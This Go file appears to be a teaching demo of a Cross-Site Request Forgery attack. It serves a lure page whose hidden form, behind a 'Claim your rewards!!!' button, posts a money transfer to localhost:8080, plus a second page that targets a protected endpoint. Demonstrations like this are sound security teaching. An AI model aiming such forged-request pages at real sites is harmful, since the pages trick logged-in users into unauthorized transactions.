// Package main implements a CSRF (Cross-Site Request Forgery) attack demonstration server.
// This file showcases vulnerable endpoints that do not properly validate CSRF tokens,
// allowing attackers to perform unauthorized actions on behalf of authenticated users.

package main

import (
	"fmt"
	"io"
	"log"
	"net/http"

	"howa.in/common"
)

func main() {
	server, handlerMux, err := common.SetupHTTPServer("", "7070")
	if err != nil {
		log.Default().Fatal(err)
	}
	handlerMux.HandleFunc("/", handleHome)
	handlerMux.HandleFunc("/csrf-safe", handleSafe)
	fmt.Println("CSRF attack server running on :7070")
	log.Default().Fatal(server.ListenAndServe())
}

// handleHome serves a page that demonstrates a CSRF attack. It contains a form that submits a POST request to the vulnerable /transfer endpoint.
func handleHome(w http.ResponseWriter, r *http.Request) {
	html := `
  <h1>Welcome to the CSRF Attack server</h1>
  <form action="http://localhost:8080/transfer" method="POST">
    <input type="hidden" name="amount" value="100">
    <input type="submit" value="Claim your rewards!!!">
  </form>
  `
	w.Header().Add("Content-Type", "text/html")
	io.WriteString(w, html)
}

// handleSafe serves a page that demonstrates a safe endpoint protected against CSRF attacks.
func handleSafe(w http.ResponseWriter, r *http.Request) {
	html := `
  <h1>Welcome to the CSRF Attack server</h1>
  <form action="http://localhost:8080/transfer-safe" method="POST">
    <input type="hidden" name="amount" value="100">
    <input type="submit" value="Claim your rewards!!!">
  </form>
  `
	w.Header().Add("Content-Type", "text/html")
	io.WriteString(w, html)
}
